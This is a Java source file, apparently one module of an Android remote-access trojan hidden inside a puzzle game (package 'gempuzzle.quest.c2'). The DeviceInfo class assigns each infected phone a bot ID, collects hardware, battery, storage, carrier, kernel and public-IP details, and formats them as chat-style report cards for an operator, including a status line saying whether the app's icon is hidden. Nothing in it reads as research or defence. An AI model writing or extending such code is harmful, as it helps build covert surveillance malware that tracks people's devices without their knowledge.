package com.gempuzzle.quest.c2;

import android.app.ActivityManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.telephony.TelephonyManager;

import java.io.File;
import java.net.NetworkInterface;
import java.util.UUID;

/**
 * Device info collection — manufacturer, model, hardware,
 * battery, network, storage. Generates stable SID.
 */
public final class DeviceInfo {

    public static String sid(Context ctx) {
        SharedPreferences prefs = ctx.getSharedPreferences("gq", Context.MODE_PRIVATE);
        String sid = prefs.getString("sid", null);
        if (sid == null) {
            sid = "d" + UUID.randomUUID().toString().replace("-", "").substring(0, 5).toUpperCase();
            prefs.edit().putString("sid", sid).apply();
        }
        return sid;
    }

    public static String card(Context ctx) {
        StringBuilder sb = new StringBuilder();
        sb.append("*").append(sid(ctx)).append("*\n");
        sb.append("📱 ").append(Build.MANUFACTURER).append(" ").append(Build.MODEL).append("\n");
        sb.append("🤖 Android ").append(Build.VERSION.RELEASE).append(" (API ").append(Build.VERSION.SDK_INT).append(")\n");
        sb.append("💾 RAM: ").append(ramGb(ctx)).append(" GB\n");
        sb.append("💿 Storage: ").append(storageInfo()).append("\n");
        sb.append("🔋 Battery: ").append(batteryPct(ctx)).append("%\n");
        sb.append("📶 Carrier: ").append(carrier(ctx)).append("\n");
        sb.append("🌐 IP: ").append(publicIp()).append("\n");
        sb.append("🧬 Kernel: ").append(System.getProperty("os.version", "?")).append("\n");
        return sb.toString();
    }

    public static String statusCard(Context ctx) {
        return "📊 *" + sid(ctx) + "*\n"
                + "🔋 " + batteryPct(ctx) + "% · " + (charging(ctx) ? "⚡ charging" : "🔌 discharging") + "\n"
                + "📶 " + (wifiConnected(ctx) ? "WiFi" : "Mobile") + "\n"
                + "⏰ uptime: " + uptime() + "\n"
                + "🥷 hidden: " + (IconHider.isHidden(ctx) ? "yes" : "no");
    }

    private static String ramGb(Context ctx) {
        ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
        am.getMemoryInfo(mi);
        return String.format("%.1f", mi.totalMem / (1024.0 * 1024 * 1024));
    }

    private static String storageInfo() {
        StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
        long total = stat.getTotalBytes() / (1024 * 1024 * 1024);
        long free = stat.getAvailableBytes() / (1024 * 1024 * 1024);
        return total + " GB total · " + free + " GB free";
    }

    private static int batteryPct(Context ctx) {
        BatteryManager bm = (BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
    }

    private static boolean charging(Context ctx) {
        BatteryManager bm = (BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
        return bm.isCharging();
    }

    private static boolean wifiConnected(Context ctx) {
        android.net.ConnectivityManager cm = (android.net.ConnectivityManager)
                ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        android.net.NetworkInfo ni = cm.getActiveNetworkInfo();
        return ni != null && ni.getType() == android.net.ConnectivityManager.TYPE_WIFI;
    }

    private static String carrier(Context ctx) {
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            String op = tm.getNetworkOperatorName();
            return (op == null || op.isEmpty()) ? "unknown" : op;
        } catch (Exception e) {
            return "unknown";
        }
    }

    private static String uptime() {
        long sec = android.os.SystemClock.elapsedRealtime() / 1000;
        long h = sec / 3600, m = (sec % 3600) / 60;
        return h + "h " + m + "m";
    }

    private static String publicIp() {
        try {
            java.net.URL url = new java.net.URL("https://api.ipify.org");
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            java.io.BufferedReader br = new java.io.BufferedReader(
                    new java.io.InputStreamReader(conn.getInputStream()));
            String ip = br.readLine();
            br.close();
            return ip;
        } catch (Exception e) {
            return "unknown";
        }
    }

    private DeviceInfo() {}
}
